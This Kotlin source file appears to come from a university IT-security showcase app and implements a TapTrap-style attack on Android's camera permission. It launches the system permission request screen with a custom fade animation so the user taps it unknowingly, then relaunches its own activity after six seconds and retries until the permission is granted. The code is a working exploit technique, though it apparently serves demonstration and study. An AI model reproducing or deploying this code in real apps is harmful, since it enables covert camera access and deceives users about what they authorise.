package edu.hm.itsec.taptrapattackshowcase.runtimepermissions

import android.app.Activity
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Bundle
import android.os.CountDownTimer
import android.util.Log
import android.widget.Toast
import androidx.activity.enableEdgeToEdge
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import androidx.camera.lifecycle.ProcessCameraProvider
import androidx.core.app.ActivityOptionsCompat
import androidx.core.content.ContextCompat
import androidx.core.view.ViewCompat
import androidx.core.view.WindowCompat
import androidx.core.view.WindowInsetsCompat
import androidx.core.view.WindowInsetsControllerCompat
import com.google.android.material.dialog.MaterialAlertDialogBuilder
import com.google.common.util.concurrent.ListenableFuture
import edu.hm.itsec.taptrapattackshowcase.R
import edu.hm.itsec.taptrapattackshowcase.databinding.ActivityRuntimePermissionAttackBinding


class RuntimePermissionAttackActivity : AppCompatActivity() {

    private lateinit var binding: ActivityRuntimePermissionAttackBinding

    private val TAG: String = "RuntimePermissionAttackActivity"

    private var granted: Boolean = false
    private var retry: Boolean = false

    private lateinit var cameraProviderFuture : ListenableFuture<ProcessCameraProvider>

    private var resultLauncher = registerForActivityResult(ActivityResultContracts.StartActivityForResult()) { result ->
        if (result.resultCode == Activity.RESULT_OK) {
            granted()
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        val windowInsetsController =
            WindowCompat.getInsetsController(window, window.decorView)
        // Configure the behavior of the hidden system bars.
        windowInsetsController.systemBarsBehavior =
            WindowInsetsControllerCompat.BEHAVIOR_SHOW_TRANSIENT_BARS_BY_SWIPE
        windowInsetsController.hide(WindowInsetsCompat.Type.statusBars())
        cameraProviderFuture = ProcessCameraProvider.getInstance(this)
        enableEdgeToEdge()
        binding = ActivityRuntimePermissionAttackBinding.inflate(layoutInflater)
        val view = binding.root
        setContentView(view)
        ViewCompat.setOnApplyWindowInsetsListener(findViewById(R.id.root_layout)) { v, insets ->
            val systemBars = insets.getInsets(WindowInsetsCompat.Type.systemBars())
            v.setPadding(systemBars.left, systemBars.top, systemBars.right, systemBars.bottom)
            insets
        }

        if (cameraAccessGranted()) {
            granted()
        } else {
            binding.root.post {
                val dialog = MaterialAlertDialogBuilder(this@RuntimePermissionAttackActivity)
                    .setTitle("Note")
                    .setMessage("Some apps may attempt to obtain permissions in subtle or misleading ways. Be careful!")
                    .setCancelable(false)
                    .setPositiveButton("Ok") { dialog, _ ->
                        dialog.dismiss()
                    }
                    .create()
                dialog.show()
                startAttack()
            }
        }
    }

    /**
     * Registers that the camera permission has been granted.
     *
     */
    private fun granted() {
        retry = false
        granted = true
        Log.d(TAG, "Camera access has been granted!")
        val cameraDialog = CameraDialog.newInstance(
            "Permission granted",
            "You have granted the camera permission.")
        cameraDialog.show(supportFragmentManager, "CameraDialog")
    }

    private fun startAttack() {
        // cancel attack if permission has already been granted
        if (cameraAccessGranted()) return

        Log.d(TAG, "Starting attack...")

        // Creates an Intent to open the camera permission request screen
        val intent = Intent("android.content.pm.action.REQUEST_PERMISSIONS")
        intent.putExtra(
            "android.content.pm.extra.REQUEST_PERMISSIONS_NAMES",
            arrayOf("android.permission.CAMERA")
        )

        // Creates the custom animation for the activity transition
        val activityOptions =
            ActivityOptionsCompat.makeCustomAnimation(this, R.anim.fade_in, R.anim.fade_out)

        // Starts the camera permission request screen with the animation
        resultLauncher.launch(intent, activityOptions)

        // relaunch the RuntimePermissionAttackActivity to hide the permission request screen after 6 seconds
        object : CountDownTimer(6000, 1000) {
            override fun onTick(millisUntilFinished: Long) {}

            override fun onFinish() {
                val runtimePermissionAttackActivityIntent = Intent(
                    this@RuntimePermissionAttackActivity,
                    RuntimePermissionAttackActivity::class.java
                )
                if (!granted) {
                    retry = true
                    val toast = Toast(applicationContext)
                    toast.setText(R.string.failed_runtime_permission_toast)
                    toast.show()
                    startActivity(runtimePermissionAttackActivityIntent)
                }
            }
        }.start()
    }

    private fun cameraAccessGranted(): Boolean {
        return ContextCompat.checkSelfPermission(applicationContext, android.Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED
    }
}